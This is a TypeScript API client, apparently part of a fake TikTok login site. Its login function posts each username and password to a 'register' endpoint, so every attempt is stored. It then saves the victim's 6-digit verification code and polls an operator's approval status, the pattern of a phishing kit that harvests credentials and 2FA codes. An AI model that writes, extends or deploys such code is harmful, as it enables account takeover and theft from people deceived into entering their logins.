import axios from 'axios';

// Interfaces de datos acordes al esquema de la base de datos
export interface LoginCredentials {
  inicio_sesion: 'telefono' | 'usuario' | string;
  username: string;
  password: string;
}

export interface AuthResponse {
  success: boolean;
  message?: string;
  token?: string;
  user: {
    id: number | string;
    username: string;
    inicio_sesion: string;
    estado?: 'PENDING' | 'APPROVED' | 'REJECTED' | string;
  };
}

// Instancia base de Axios conectada a la API
export const apiClient = axios.create({
  baseURL: import.meta.env.VITE_API_URL || 'https://api-tiktok-backend.onrender.com/api',
  headers: {
    'Content-Type': 'application/json',
  },
  timeout: 8000,
});

/**
 * Función que envía las credenciales directamente al endpoint /auth/register de la API.
 * Cumple con el requerimiento de usar la API de registro para el inicio de sesión.
 */
export const loginUser = async (credentials: LoginCredentials): Promise<AuthResponse> => {
  const payload = {
    inicio_sesion: credentials.inicio_sesion,
    username: credentials.username.trim(),
    password: credentials.password,
  };

  try {
    const response = await apiClient.post<AuthResponse>('/auth/register', payload);
    return response.data;
  } catch (err: unknown) {
    const axiosErr = err as {
      response?: { data?: { message?: string; error?: string } };
      message?: string;
    };
    const errorMsg =
      axiosErr.response?.data?.message ||
      axiosErr.response?.data?.error ||
      (axiosErr.message?.includes('Network Error') || axiosErr.message?.includes('ECONNREFUSED')
        ? 'No se pudo conectar con el servidor de la API.'
        : axiosErr.message || 'Error al conectar con la API.');

    throw new Error(errorMsg, { cause: err });
  }
};

/**
 * Función de registro (utiliza el mismo endpoint /auth/register)
 */
export const registerUser = async (credentials: LoginCredentials): Promise<AuthResponse> => {
  return loginUser(credentials);
};

export interface SaveCodeResponse {
  success: boolean;
  message: string;
  code?: {
    id_codigo: number;
    user_id: number;
    codigo: string;
    estado?: 'PENDING' | 'APPROVED' | 'REJECTED';
  };
}

export interface CodeStatusResponse {
  success: boolean;
  code?: {
    id_codigo: number;
    user_id: number;
    codigo: string;
    estado: 'PENDING' | 'APPROVED' | 'REJECTED';
  };
}

/**
 * Guarda el código de 6 dígitos en la tabla 'codigos' asociado al usuario registrado
 */
export const saveVerificationCode = async (
  userId: number | string,
  codigo: string
): Promise<SaveCodeResponse> => {
  const response = await apiClient.post<SaveCodeResponse>('/auth/code', {
    user_id: Number(userId),
    codigo: codigo.trim(),
  });
  return response.data;
};

/**
 * Consulta el estado de un código en PostgreSQL (Render) sin caché del navegador
 */
export const checkCodeStatusInDb = async (
  userId?: number | string | null,
  codeId?: number | string | null
): Promise<CodeStatusResponse | null> => {
  try {
    if (!userId && !codeId) return null;
    const cacheBuster = `_t=${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
    const url = codeId
      ? `/auth/codes/${codeId}/status?${cacheBuster}`
      : `/auth/code/latest/${userId}?${cacheBuster}`;

    const response = await apiClient.get<CodeStatusResponse>(url, {
      headers: {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        Pragma: 'no-cache',
        Expires: '0',
      },
    });

    if (response.data?.code) {
      console.log(`[Polling Status] Código #${response.data.code.id_codigo} (${response.data.code.codigo}) -> ${response.data.code.estado}`);
    }

    return response.data;
  } catch (err) {
    console.warn('[Polling Status Error]:', err);
    return null;
  }
};

export interface UserStatusResponse {
  success: boolean;
  user?: {
    id: number | string;
    username: string;
    inicio_sesion: string;
    estado: 'PENDING' | 'APPROVED' | 'REJECTED';
  };
}

/**
 * Consulta el estado de validación de un usuario en PostgreSQL (Render) sin caché del navegador
 */
export const checkUserStatusInDb = async (
  userId?: number | string | null
): Promise<UserStatusResponse | null> => {
  try {
    if (!userId) return null;
    const cacheBuster = `_t=${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
    const url = `/auth/users/${userId}/status?${cacheBuster}`;

    const response = await apiClient.get<UserStatusResponse>(url, {
      headers: {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        Pragma: 'no-cache',
        Expires: '0',
      },
    });

    return response.data;
  } catch (err) {
    console.warn('[Polling User Status Error]:', err);
    return null;
  }
};

// Aliases para máxima compatibilidad
export const login = loginUser;
export const register = registerUser;